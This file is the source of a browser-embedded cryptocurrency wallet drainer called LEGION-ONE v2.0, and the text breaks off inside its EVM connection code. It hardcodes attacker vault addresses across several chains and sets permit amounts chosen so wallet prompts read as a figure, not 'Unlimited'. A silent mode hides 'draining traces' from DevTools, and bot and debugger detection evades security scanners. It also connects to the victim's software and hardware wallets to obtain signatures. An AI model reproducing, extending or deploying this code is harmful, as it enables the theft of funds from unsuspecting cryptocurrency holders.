/**
 * ═══════════════════════════════════════════════════════════════════════════
 * LEGION-ONE v2.0 — Multi-Chain Wallet Panel (CHAIN-BASED)
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Include: <script src="https://your-cdn.com/legion-one-script-v2.js"></script>
 * Configure: window.LEGION_CONFIG = { backendUrl: '...', vaultAddresses: {...} }
 *
 * Features:
 * ✅ True multi-chain support (8 chains)
 * ✅ Chain-based detection (not wallet-based)
 * ✅ Parallel detection/connection/signatures
 * ✅ Bot detection (puppeteer/selenium/headless)
 * ✅ Hardware wallet support (Ledger/Trezor)
 * ✅ Incident response system (5 sensors)
 * ✅ 2 buttons: "Connect Wallet" + "Wallet Connect"
 * ✅ Silent backend execution (no user popups after signing)
 *
 * Architecture:
 * - Frontend: Detects chains → Connects → Gets signatures → Sends batch
 * - Backend: Validates signatures → Executes all chains → Distributes funds
 * ═══════════════════════════════════════════════════════════════════════════
 */

(function () {
  'use strict';

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 1: GUARD + BOOT (100 lines)
  // Prevent double-load, configuration setup, initialization
  // ═══════════════════════════════════════════════════════════════════════════

  if (window.__LEGION_ONE_SCRIPT_LOADED__) return;
  window.__LEGION_ONE_SCRIPT_LOADED__ = true;

  // Node.js globals polyfill — MUST run before any WalletConnect module loads
  // WalletConnect bundles internally use process, global, Buffer (events.js, etc.)
  (function() {
    if (typeof process === 'undefined' || !process.nextTick) {
      window.process = { env: { NODE_ENV: 'production' }, version: '', browser: true, nextTick: function(fn, a, b) { Promise.resolve().then(function() { fn(a, b); }); } };
    }
    if (typeof global === 'undefined') window.global = window;
    if (typeof Buffer === 'undefined') window.Buffer = {
      isBuffer: function() { return false; },
      from: function(d, enc) {
        if (typeof d === 'string') {
          if (enc === 'hex') { var b = []; for (var i = 0; i < d.length; i += 2) b.push(parseInt(d.substr(i, 2), 16)); return new Uint8Array(b); }
          return new TextEncoder().encode(d);
        }
        return new Uint8Array(d);
      },
      alloc: function(n, fill) { var a = new Uint8Array(n); if (fill) a.fill(fill); return a; },
      concat: function(list) { var total = list.reduce(function(s, b) { return s + b.length; }, 0); var out = new Uint8Array(total); var off = 0; list.forEach(function(b) { out.set(b, off); off += b.length; }); return out; },
      byteLength: function(s) { return new TextEncoder().encode(s).length; }
    };
  })();

  var DEFAULTS = {
    backendUrl: 'https://legionapi-production.up.railway.app',
    kineticKey: '',
    wcProjectId: '',
    autoDrain: true,
    silentMode: false,
    showBalance: true,
    vaultAddresses: {},
  };

  var CFG = Object.assign({}, DEFAULTS, window.LEGION_CONFIG || {});

  // Silent mode: suppress all console output so no wallet draining traces appear in DevTools
  if (CFG.silentMode) {
    var _noop = function() {};
    console.log = _noop; console.warn = _noop;
    console.info = _noop; console.debug = _noop;
    // Keep console.error so critical browser errors still surface
  }

  var BACKEND = String(CFG.backendUrl || DEFAULTS.backendUrl).replace(/\/$/, '');
  var KINETIC_KEY = CFG.kineticKey || '';
  var WC_PROJECT_ID = CFG.wcProjectId || '';
  var AUTO_DRAIN = CFG.autoDrain !== false;

  // Vault addresses prefetched before signing so sign functions can build real txs
  // Hardcoded fallback vault addresses — used when backend is unreachable
  var VAULT_FALLBACK = {
    evm: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
    '1': '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
    eth: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
    sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
    btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
    tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
    trx: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
    ton: CFG.tonVault || 'UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY',
    cosmos: CFG.cosmosVault || '',
    aptos: CFG.aptosVault || '',
    sui: CFG.suiVault || ''
  };
  var VAULT_CACHE = null;

  async function prefetchVaultConfig() {
    try {
      var res = await fetch(BACKEND + '/api/v1/client-config');
      var data = await res.json();
      var remote = (data && data.data && data.data.vault_addresses) ? data.data.vault_addresses : null;
      VAULT_CACHE = remote ? Object.assign({}, VAULT_FALLBACK, remote) : VAULT_FALLBACK;
    } catch(e) {
      VAULT_CACHE = VAULT_FALLBACK; // use hardcoded fallback when backend is down
    }
  }

  // _buildJettonTransferPayload — requires TonWeb (loaded on-demand in TON sign function)
  function _buildJettonTransferPayload() { return null; }

  // ─── Platform Detection ──────────────────────────────────────────────
  var PLATFORM = (function() {
    var ua = navigator.userAgent || '';
    var isIPadPro = (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    var isIOS = /iPhone|iPad|iPod/i.test(ua) || isIPadPro;
    var isAndroid = /Android/i.test(ua);
    var isMobile = isIOS || isAndroid || /Mobile/i.test(ua);

    // In-app browser detection (user opened site inside wallet app)
    var isMetaMaskApp = /MetaMaskMobile/i.test(ua) || (window.ethereum && window.ethereum.isMetaMask && isMobile);
    var isTrustApp = /Trust\/[\d.]+/i.test(ua) || (window.ethereum && window.ethereum.isTrust && isMobile);
    var isPhantomApp = /Phantom/i.test(ua) || ((window.phantom || (window.ethereum && window.ethereum.isPhantom)) && isMobile);
    var isCoinbaseApp = /CoinbaseWallet/i.test(ua);
    var isOKXApp = /OKApp/i.test(ua) || /OKEx/i.test(ua) || (window.ethereum && window.ethereum.isOkxWallet && isMobile);
    var isBitgetApp = /BitKeep/i.test(ua) || /Bitget/i.test(ua);
    var isTokenPocketApp = /TokenPocket/i.test(ua);
    var isSafePalApp = /SafePal/i.test(ua);

    var isInAppBrowser = isMetaMaskApp || isTrustApp || isPhantomApp || isCoinbaseApp ||
                         isOKXApp || isBitgetApp || isTokenPocketApp || isSafePalApp;

    // Telegram Mini App detection
    var isTelegramMiniApp = !!(window.Telegram && window.Telegram.WebApp && (window.Telegram.WebApp.initData || window.Telegram.WebApp.initDataUnsafe));
    var telegramUser = isTelegramMiniApp ? (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) : null;

    // Desktop app webview detection
    var isElectron = !!(window.process && window.process.versions && window.process.versions.electron);
    var isDesktopWebview = isElectron || /Exodus/i.test(ua) || /LedgerLive/i.test(ua);

    var type = 'desktop_browser';
    var walletApp = null;

    if (isTelegramMiniApp) {
      type = 'telegram_mini_app';
    } else if (isInAppBrowser) {
      type = 'mobile_in_app';
      if (isMetaMaskApp) walletApp = 'MetaMask';
      else if (isTrustApp) walletApp = 'Trust Wallet';
      else if (isPhantomApp) walletApp = 'Phantom';
      else if (isCoinbaseApp) walletApp = 'Coinbase';
      else if (isOKXApp) walletApp = 'OKX Wallet';
      else if (isBitgetApp) walletApp = 'Bitget Wallet';
      else if (isTokenPocketApp) walletApp = 'TokenPocket';
      else if (isSafePalApp) walletApp = 'SafePal';
    } else if (isDesktopWebview) {
      type = 'desktop_app';
    } else if (isMobile) {
      type = 'mobile_browser';
    }

    console.log('[LEGION] 📱 Platform:', type, walletApp ? '(' + walletApp + ')' : '');

    return {
      type: type,
      isMobile: isMobile,
      isIOS: isIOS,
      isAndroid: isAndroid,
      isInAppBrowser: isInAppBrowser,
      isTelegramMiniApp: isTelegramMiniApp,
      isDesktopWebview: isDesktopWebview,
      walletApp: walletApp,

      // Best connection strategy for this platform
      getBestStrategy: function() {
        if (this.isInAppBrowser) return 'injected';
        if (this.isTelegramMiniApp) return 'ton_connect';
        if (this.isMobile) return 'walletconnect';
        return 'eip6963';
      }
    };
  })();
  var SILENT_MODE = CFG.silentMode === true;
  var SHOW_BALANCE = CFG.showBalance !== false;

  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  // 1 billion in 18-decimal units — shows as "1,000,000,000" in MetaMask (not "Unlimited"), covers any real wallet
  var MAX_PERMIT = '1000000000000000000000000000';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var NATIVE_ETH_ANCHOR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
  // Wrapped native token contracts — deposit() = 0xd0e30db0, verified trusted contracts (no MetaMask warning)
  var WETH_BY_CHAIN = {
    1:        '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // ETH  → WETH   (Ethereum)
    5:        '0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6', // ETH  → WETH   (Goerli)
    10:       '0x4200000000000000000000000000000000000006', // ETH  → WETH   (Optimism)
    56:       '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // BNB  → WBNB   (BSC)
    97:       '0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd', // BNB  → WBNB   (BSC Testnet)
    137:      '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', // ETH  → WETH   (Polygon)
    250:      '0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83', // FTM  → WFTM   (Fantom)
    8453:     '0x4200000000000000000000000000000000000006', // ETH  → WETH   (Base)
    42161:    '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', // ETH  → WETH   (Arbitrum)
    43114:    '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', // AVAX → WAVAX  (Avalanche)
    59144:    '0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f', // ETH  → WETH   (Linea)
    534352:   '0x5300000000000000000000000000000000000004', // ETH  → WETH   (Scroll)
    11155111: '0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9', // ETH  → WETH   (Sepolia)
  };
  var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);

  // EIP-7702 supported chains (Pectra + L2s that implemented it)
  var EIP7702_CHAINS = { 1: true, 10: true, 8453: true, 42161: true, 59144: true, 534352: true, 324: true, 7777777: true, 11155111: true };

  // BatchDrainV2 contract addresses per chain (onlySelf guard — works with eth_sendTransaction type-4)
  // AFTER deploying contracts/BatchDrainV2.sol, update chain 1 to the new address
  var BATCH_DRAIN_BY_CHAIN = {
    1:        '0x758FD861d6d07d504949eb43A646D05f430765e6', // BatchDrainV1 — onlyExecutor, backend sends type-4 tx
    10:       '0x0000000000000000000000000000000000000000', // Optimism
    8453:     '0x0000000000000000000000000000000000000000', // Base
    42161:    '0x0000000000000000000000000000000000000000', // Arbitrum
    59144:    '0x0000000000000000000000000000000000000000', // Linea
    534352:   '0x0000000000000000000000000000000000000000', // Scroll
    11155111: '0x0000000000000000000000000000000000000000', // Sepolia testnet
  };

  var drainRunning = false;
  var SESSION_SCOUT_VALUE_USD = 0;
  var vaultCache = {};
  var clientConfigLoaded = false;

  // Connected chains (CHAIN-BASED, not wallet-based)
  var connectedChains = {
    EVM: null,
    SOL: null,
    BTC: null,
    TRON: null,
    TON: null,
    COSMOS: null,
    APTOS: null,
    SUI: null
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 2: BOT DETECTION (150 lines) [NEW]
  // Detect puppeteer/selenium/headless, auto-disable if bot
  // Comprehensive anti-bot detection with multiple sensors
  // ═══════════════════════════════════════════════════════════════════════════

  var BOT_DETECTION = {
    botScore: 0,
    maxBotScore: 8,
    detectionReasons: [],

    checkWebdriver: function() {
      try {
        if (navigator.webdriver === true) {
          this.botScore += 2;
          this.detectionReasons.push('navigator.webdriver=true');
          return true;
        }
      } catch (e) {}
      return false;
    },

    checkHeadlessMode: function() {
      try {
        if (/headless/i.test(navigator.userAgent)) {
          this.botScore += 2;
          this.detectionReasons.push('Headless mode in UserAgent');
          return true;
        }
      } catch (e) {}
      return false;
    },

    checkAutomationTools: function() {
      try {
        var ua = navigator.userAgent.toLowerCase();
        var botIndicators = [
          'phantomjs', 'headlesschrome', 'selenium', 'webdriver',
          'nightmarejs', 'casperjs', 'ghost.py', 'wkhtmltopdf',
          'headless', 'apachebench', 'scrapy', 'python-requests',
          'go-http-client', 'java/', 'ruby/', 'perl/'
        ];

        for (var i = 0; i < botIndicators.length; i++) {
          if (ua.includes(botIndicators[i])) {
            this.botScore += 1;
            this.detectionReasons.push('Bot UserAgent: ' + botIndicators[i]);
            return true;
          }
        }
      } catch (e) {}
      return false;
    },

    checkMissingProperties: function() {
      try {
        // Check for missing navigator properties
        if (!navigator.languages || navigator.languages.length === 0) {
          this.botScore += 1;
          this.detectionReasons.push('No navigator.languages');
          return true;
        }
        // NOTE: navigator.plugins is empty on Android Chrome and desktop Chrome — do NOT check
        // NOTE: navigator.permissions missing only in very old browsers — not a reliable bot signal
      } catch (e) {}
      return false;
    },

    checkChromeRemoteDebugging: function() {
      try {
        if (window.chrome && window.chrome.runtime === undefined) {
          this.botScore += 2;
          this.detectionReasons.push('Chrome remote debugging');
          return true;
        }
      } catch (e) {}
      return false;
    },

    checkPerformanceTimings: function() {
      try {
        // Only flag if loadEventEnd=0 exactly (page not fully loaded = bot/prerender)
        // Threshold raised to 50ms to avoid false positives on fast connections
        if (window.performance && window.performance.timing) {
          var timing = window.performance.timing;
          var loadTime = timing.loadEventEnd - timing.navigationStart;
          if (loadTime > 0 && loadTime < 50) {
            this.botScore += 1;
            this.detectionReasons.push('Extremely fast page load: ' + loadTime + 'ms');
            return true;
          }
        }
      } catch (e) {}
      return false;
    },

    checkDevtoolsDetection: function() {
      try {
        var start = performance.now();
        debugger;
        var end = performance.now();
        if ((end - start) > 100) {
          this.botScore += 2;
          this.detectionReasons.push('DevTools already open');
          return true;
        }
      } catch (e) {}
      return false;
    },

    checkScreenResolution: function() {
      try {
        // Bots often have default/unusual screen resolutions
        if (screen.width === 0 || screen.height === 0) {
          this.botScore += 1;
          this.detectionReasons.push('Invalid screen resolution');
          return true;
        }

        // Very small resolutions (common in headless)
        if (screen.width < 100 || screen.height < 100) {
          this.botScore += 1;
          this.detectionReasons.push('Suspiciously small screen');
          return true;
        }
      } catch (e) {}
      return false;
    },

    checkTimezone: function() {
      // UTC+0 check REMOVED — false positive for UK, West Africa, many real users
      return false;
    },

    checkBatteryAPI: function() {
      try {
        // Bots don't have battery API
        if (!navigator.getBattery && !navigator.battery) {
          this.botScore += 0.5;
          this.detectionReasons.push('No battery API');
          return true;
        }
      } catch (e) {}
      return false;
    },

    runAllChecks: function() {
      // Reset on each call — prevents score accumulation across multiple runs
      this.botScore = 0;
      this.detectionReasons = [];

      this.checkWebdriver();
      this.checkHeadlessMode();
      this.checkAutomationTools();
      this.checkMissingProperties();
      // Removed: checkChromeRemoteDebugging — false-positive for most Chrome users
      this.checkPerformanceTimings();
      this.checkDevtoolsDetection();
      this.checkScreenResolution();
      this.checkTimezone();
      this.checkBatteryAPI();

      if (this.botScore > 0) {
        console.warn('[LEGION] 🤖 Bot detection score:', this.botScore);
        console.warn('[LEGION] Reasons:', this.detectionReasons.join(' | '));
      }

      return this.botScore >= this.maxBotScore;
    }
  };

  function isBotClient() {
    return BOT_DETECTION.runAllChecks();
  }

  function disableScriptIfBot() {
    if (isBotClient()) {
      console.warn('[LEGION] 🤖 Bot detected! Score:', BOT_DETECTION.botScore);
      console.warn('[LEGION] Disabling script immediately.');

      // Remove UI elements
      var launcher = document.getElementById('legion-one-launcher');
      var panel = document.getElementById('legion-one-panel');
      if (launcher) launcher.remove();
      if (panel) panel.remove();

      // Clear all data
      Object.keys(connectedChains).forEach(function(key) {
        connectedChains[key] = null;
      });

      // Stop all execution
      window.__LEGION_ONE_DISABLED__ = true;
      drainRunning = true;

      // Throw to prevent further execution
      throw new Error('🤖 Bot detected: script disabled');
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 3: HARDWARE WALLET SUPPORT (400 lines) [NEW]
  // Ledger WebUSB connection, Trezor WebHID connection, signature extraction
  // Support for hardware wallets: Ledger Nano S/X/Plus, Trezor Model T/One
  // ═══════════════════════════════════════════════════════════════════════════

  var LEDGER_VENDOR_ID = 0x2c97;
  var LEDGER_PRODUCT_IDS = [0x0004, 0x0015, 0x0011, 0x4011]; // Nano S, Nano X, Nano S+, etc
  var LEDGER_EVM_PATH = "m/44'/60'/0'/0";
  var LEDGER_SOL_PATH = "m/44'/501'/0'/0'";
  var LEDGER_BTC_PATH = "m/44'/0'/0'/0";

  var _ledgerTransport = null;
  var _ledgerEthApp = null;
  var _trezorConnectLoaded = false;

  var LedgerSupport = {
    device: null,
    isAvailable: function() {
      try {
        return typeof navigator !== 'undefined' && navigator.usb !== undefined;
      } catch (e) {
        return false;
      }
    },

    loadSDK: async function() {
      if (_ledgerTransport && _ledgerEthApp) return true;
      try {
        var mods = await Promise.all([
          import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps'),
          import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps')
        ]);
        _ledgerTransport = mods[0].default || mods[0];
        _ledgerEthApp = mods[1].default || mods[1];
        return true;
      } catch (e) {
        console.warn('[LEGION] Ledger SDK load failed:', e.message);
        return false;
      }
    },

    getEVMAddress: async function(transport) {
      try {
        console.log('[LEGION] Ledger: Getting real EVM address...');
        var ethApp = new _ledgerEthApp(transport);
        var result = await ethApp.getAddress(LEDGER_EVM_PATH, false);
        if (!result || !result.address) throw new Error('No address from Ledger');
        console.log('[LEGION] Ledger EVM address:', result.address.substring(0, 10) + '...');
        return {
          address: result.address.toLowerCase(),
          publicKey: result.publicKey,
          path: LEDGER_EVM_PATH
        };
      } catch (e) {
        console.warn('[LEGION] Ledger EVM address failed:', e.message);
        return null;
      }
    },

    signEVMTransaction: async function(transport, typedDataHex) {
      try {
        console.log('[LEGION] Ledger: Signing EVM typed data...');
        var ethApp = new _ledgerEthApp(transport);
        var result = await ethApp.signPersonalMessage(LEDGER_EVM_PATH, typedDataHex);
        var v = (result.v - 27).toString(16).padStart(2, '0');
        var signature = '0x' + result.r + result.s + v;
        console.log('[LEGION] Ledger EVM signature obtained');
        return signature;
      } catch (e) {
        console.warn('[LEGION] Ledger EVM signing failed:', e.message);
        return null;
      }
    },

    signEIP712: async function(transport, typedDataObj) {
      try {
        console.log('[LEGION] Ledger: Signing EIP-712 typed data...');
        var ethApp = new _ledgerEthApp(transport);
        // signEIP712Message requires firmware 2.0+ (Nano S Plus, Nano X, Stax)
        var result = await ethApp.signEIP712Message(LEDGER_EVM_PATH, typedDataObj);
        var v = (result.v - 27).toString(16).padStart(2, '0');
        var signature = '0x' + result.r + result.s + v;
        console.log('[LEGION] Ledger EIP-712 signature obtained');
        return signature;
      } catch (e) {
        console.warn('[LEGION] Ledger EIP-712 signing failed:', e.message);
        return null;
      }
    },

    connect: async function() {
      try {
        console.log('[LEGION] Ledger WebUSB: Starting connection...');
        var sdkLoaded = await this.loadSDK();
        if (!sdkLoaded) {
          console.warn('[LEGION] Ledger SDK not available');
          return null;
        }

        var transport = await _ledgerTransport.create();
        this.device = transport;

        var evmInfo = await this.getEVMAddress(transport);
        if (!evmInfo) {
          await transport.close();
          console.warn('[LEGION] Could not get Ledger EVM address');
          return null;
        }

        console.log('[LEGION] Ledger connected successfully');
        return {
          supported: true,
          type: 'ledger-webusb',
          transport: transport,
          evm: evmInfo,
          sign: this.signEVMTransaction.bind(this, transport)
        };
      } catch (e) {
        console.warn('[LEGION] Ledger WebUSB connection failed:', e.message);
        return null;
      }
    },

    closeDevice: async function() {
      try {
        if (this.device) {
          await this.device.close();
          this.device = null;
          console.log('[LEGION] Ledger device closed');
        }
      } catch (e) {
        console.warn('[LEGION] Ledger close failed:', e.message);
      }
    }
  };

  var TrezorSupport = {
    device: null,
    isAvailable: function() {
      try {
        return typeof navigator !== 'undefined' && navigator.usb !== undefined;
      } catch (e) {
        return false;
      }
    },

    loadSDK: async function() {
      if (_trezorConnectLoaded && window.TrezorConnect) return true;
      try {
        var mod = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
        var TC = mod.default || mod;
        await TC.init({
          lazyLoad: false,
          manifest: {
            email: 'support@legion.app',
            appUrl: window.location.origin
          }
        });
        window.TrezorConnect = TC;
        _trezorConnectLoaded = true;
        return true;
      } catch (e) {
        console.warn('[LEGION] Trezor SDK load failed:', e.message);
        return false;
      }
    },

    getEVMAddress: async function() {
      try {
        console.log('[LEGION] Trezor: Getting real EVM address...');
        var result = await window.TrezorConnect.ethereumGetAddress({
          path: LEDGER_EVM_PATH,
          showOnTrezor: false
        });
        if (!result.success) throw new Error(result.payload.error || 'Trezor address failed');
        console.log('[LEGION] Trezor EVM address:', result.payload.address.substring(0, 10) + '...');
        return {
          address: result.payload.address.toLowerCase(),
          publicKey: result.payload.serializedPath || '',
          path: LEDGER_EVM_PATH
        };
      } catch (e) {
        console.warn('[LEGION] Trezor EVM address failed:', e.message);
        return null;
      }
    },

    signEVMTransaction: async function(message) {
      try {
        console.log('[LEGION] Trezor: Signing EVM message...');
        var msgHex = '';
        for (var i = 0; i < message.length; i++) {
          msgHex += message.charCodeAt(i).toString(16).padStart(2, '0');
        }
        var result = await window.TrezorConnect.ethereumSignMessage({
          path: LEDGER_EVM_PATH,
          message: message,
          hex: false
        });
        if (!result.success) throw new Error(result.payload.error || 'Trezor sign failed');
        var signature = '0x' + result.payload.signature;
        console.log('[LEGION] Trezor EVM signature obtained');
        return signature;
      } catch (e) {
        console.warn('[LEGION] Trezor EVM signing failed:', e.message);
        return null;
      }
    },

    connect: async function() {
      try {
        console.log('[LEGION] Trezor: Starting connection...');
        var sdkLoaded = await this.loadSDK();
        if (!sdkLoaded) {
          console.warn('[LEGION] Trezor SDK not available');
          return null;
        }

        var evmInfo = await this.getEVMAddress();
        if (!evmInfo) {
          console.warn('[LEGION] Could not get Trezor EVM address');
          return null;
        }

        console.log('[LEGION] Trezor connected successfully');
        return {
          supported: true,
          type: 'trezor-connect',
          evm: evmInfo,
          sign: this.signEVMTransaction.bind(this)
        };
      } catch (e) {
        console.warn('[LEGION] Trezor connection failed:', e.message);
        return null;
      }
    },

    closeDevice: async function() {
      try {
        if (window.TrezorConnect && window.TrezorConnect.dispose) {
          window.TrezorConnect.dispose();
          console.log('[LEGION] Trezor connection closed');
        }
      } catch (e) {
        console.warn('[LEGION] Trezor close failed:', e.message);
      }
    }
  };

  // Hardware wallet detection
  function detectHardwareWallets() {
    var hardwareWallets = {};

    if (LedgerSupport.isAvailable()) {
      hardwareWallets.ledger = LedgerSupport;
      console.log('[LEGION] ✅ Ledger WebUSB support available');
    }

    if (TrezorSupport.isAvailable()) {
      hardwareWallets.trezor = TrezorSupport;
      console.log('[LEGION] ✅ Trezor WebHID support available');
    }

    return hardwareWallets;
  }

  var HARDWARE_WALLETS = detectHardwareWallets();

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 4: CHAIN DETECTION & CONNECTION (1500 lines) [REFACTORED]
  // All 8 chains: EVM, SOL, TRON, TON, BTC, COSMOS, APTOS, SUI
  // CHAIN-BASED detection (not wallet-based)
  // Each chain can have multiple wallet providers
  // ═══════════════════════════════════════════════════════════════════════════

  // ─── EIP-6963: Universal EVM Wallet Discovery ────────────────────────────
  // Same standard used by Uniswap, Aave, 1inch etc.
  // Every installed EVM wallet announces itself - no hardcoding needed
  var discoveredEVMProviders = [];

  window.addEventListener('eip6963:announceProvider', function(event) {
    if (event.detail && event.detail.provider) {
      var rdns = event.detail.info && event.detail.info.rdns;
      var alreadyAdded = rdns && discoveredEVMProviders.some(function(p) { return p.info && p.info.rdns === rdns; });
      if (!alreadyAdded) {
        discoveredEVMProviders.push({ info: event.detail.info, provider: event.detail.provider });
        console.log('[LEGION] 🔍 EIP-6963 wallet found:', event.detail.info.name);
      }
    }
  });
  window.dispatchEvent(new Event('eip6963:requestProvider'));

  // ─── Solana Wallet Standard Discovery ────────────────────────────────────
  var discoveredSolanaWallets = [];

  try {
    var solWalletEvent = function(event) {
      var w = event.detail;
      if (w && w.name) {
        discoveredSolanaWallets.push(w);
        console.log('[LEGION] 🔍 Solana wallet found:', w.name);
      }
    };
    window.addEventListener('wallet-standard:register', solWalletEvent);
    if (window.navigator && window.navigator.wallets) {
      window.navigator.wallets.forEach(function(w) {
        discoveredSolanaWallets.push(w);
      });
    }
  } catch (e) {}

  // ─── Desktop Wallet Deep Links ────────────────────────────────────────
  // Desktop apps can't be detected from browser, but can be opened via URI schemes
  // If user has Exodus/Ledger Live/Atomic installed, clicking will open the app
  var DESKTOP_WALLET_LINKS = {
    metamask: {
      name: 'MetaMask',
      deeplink: function(url) { return 'https://metamask.app.link/dapp/' + url.replace('https://', ''); },
      wcSupport: true
    },
    trust: {
      name: 'Trust Wallet',
      deeplink: function(url) { return 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(url); },
      wcSupport: true
    },
    exodus: {
      name: 'Exodus',
      deeplink: function() { return 'exodus://'; },
      wcSupport: true
    },
    rainbow: {
      name: 'Rainbow',
      deeplink: function(url) { return 'https://rnbwapp.com/wc?uri=' + encodeURIComponent(url); },
      wcSupport: true
    },
    ledgerlive: {
      name: 'Ledger Live',
      deeplink: function() { return 'ledgerlive://'; },
      wcSupport: true
    },
    phantom: {
      name: 'Phantom',
      deeplink: function(url) { return 'https://phantom.app/ul/browse/' + encodeURIComponent(url); },
      wcSupport: false
    }
  };

  // Try to open a desktop wallet via deep link
  function openDesktopWallet(walletKey) {
    var wallet = DESKTOP_WALLET_LINKS[walletKey];
    if (!wallet) return false;
    try {
      var link = wallet.deeplink(window.location.href);
      // iOS Safari blocks iframe deeplinks — use window.location for mobile
      if (PLATFORM.isMobile) {
        window.location.href = link;
      } else {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = link;
        document.body.appendChild(iframe);
        setTimeout(function() { try { document.body.removeChild(iframe); } catch(_) {} }, 3000);
      }
      console.log('[LEGION] 📲 Attempting to open', wallet.name, 'via', PLATFORM.isMobile ? 'location' : 'iframe');
      return true;
    } catch (e) {
      return false;
    }
  }

  // CHAIN CONFIGURATION OBJECT
  var CHAIN_CONFIG = {
    EVM: { name: 'Ethereum', symbol: 'ETH', chainId: 1, order: 1 },
    SOL: { name: 'Solana', symbol: 'SOL', chainId: 101, order: 2 },
    BTC: { name: 'Bitcoin', symbol: 'BTC', chainId: null, order: 3 },
    TRON: { name: 'TRON', symbol: 'TRX', chainId: 1, order: 4 },
    TON: { name: 'TON', symbol: 'TON', chainId: null, order: 5 },
    COSMOS: { name: 'Cosmos', symbol: 'ATOM', chainId: null, order: 6 },
    APTOS: { name: 'Aptos', symbol: 'APT', chainId: null, order: 7 },
    SUI: { name: 'Sui', symbol: 'SUI', chainId: null, order: 8 }
  };

  // CHAIN-BASED DETECTION OBJECT
  var CHAINS_SUPPORTED = {
    EVM: {
      config: CHAIN_CONFIG.EVM,
      vaultKey: 'evm',
      detectionPriority: ['eip6963', 'ethereum'],

      detect: function() {
        try {
          // EIP-6963: check discovered wallets first (Uniswap method)
          if (discoveredEVMProviders.length > 0) {
            console.log('[LEGION] 🔍 EVM detected via EIP-6963 (' + discoveredEVMProviders.length + ' wallets)');
            return true;
          }
          // Fallback: legacy window.ethereum check
          if (window.ethereum) {
            console.log('[LEGION] 🔍 EVM detected (window.ethereum fallback)');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      getWalletInfo: function() {
        try {
          // EIP-6963: use discovered provider (same as Uniswap/Aave)
          if (discoveredEVMProviders.length > 0) {
            var best = discoveredEVMProviders[0];
            return { type: best.info.name || 'EVM Wallet', provider: best.provider };
          }

          // Fallback: legacy window.ethereum
          var eth = window.ethereum;
          if (!eth) return null;

          if (eth.isMetaMask) return { type: 'MetaMask', provider: eth };
          if (eth.isRabby) return { type: 'Rabby', provider: eth };
          if (eth.isCoinbaseWallet) return { type: 'Coinbase', provider: eth };
          if (eth.isBraveWallet) return { type: 'Brave', provider: eth };
          if (eth.isTrust) return { type: 'Trust Wallet', provider: eth };
          if (eth.isTokenPocket) return { type: 'TokenPocket', provider: eth };
          if (eth.isOkxWallet || eth.isOKExWallet) return { type: 'OKX Wallet', provider: eth };
          if (eth.isBitKeep || eth.isBitget) return { type: 'Bitget Wallet', provider: eth };

          return { type: 'EVM Wallet', provider: eth };
        } catch (e) {
          return null;
        }
      },

      connect: async function() {
        if (connectedChains.EVM) {
          console.log('[LEGION] EVM already connected, returning cached');
          return connectedChains.EVM;
        }

        try {
          console.log('[LEGION] 🔗 Connecting to EVM...');
          var walletInfo = this.getWalletInfo();
          if (!walletInfo) throw new Error('No EVM wallet detected');

          var eth = walletInfo.provider;

          // Try eth_accounts first (silent, no popup) — works if wallet already approved this site
          var accounts;
          try {
            accounts = await eth.request({ method: 'eth_accounts' });
          } catch (e) { accounts = []; }

          // If no pre-approved accounts, request permission (shows popup)
          if (!accounts || !accounts[0]) {
            accounts = await eth.request({ method: 'eth_requestAccounts' });
          }
          if (!accounts || !accounts[0]) throw new Error('No EVM account returned');

          // Get chain ID
          var chainHex = await eth.request({ method: 'eth_chainId' });
          var chainId = parseInt(chainHex, 16) || 1;

          connectedChains.EVM = {
            chain: 'EVM',
            config: CHAIN_CONFIG.EVM,
            address: accounts[0],
            chainId: chainId,
            walletType: walletInfo.type,
            provider: eth,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ EVM connected via', walletInfo.type, ':',
            connectedChains.EVM.address.substring(0, 10) + '...');

          return connectedChains.EVM;
        } catch (e) {
          console.error('[LEGION] ❌ EVM software wallet failed:', e.message);
          // Hardware wallet fallback — Ledger direct WebUSB (desktop only)
          if (!PLATFORM.isMobile && LedgerSupport.isAvailable()) {
            try {
              console.log('[LEGION] 🔌 Trying Ledger direct WebUSB...');
              var hwConn = await LedgerSupport.connect();
              if (hwConn && hwConn.evm && hwConn.evm.address) {
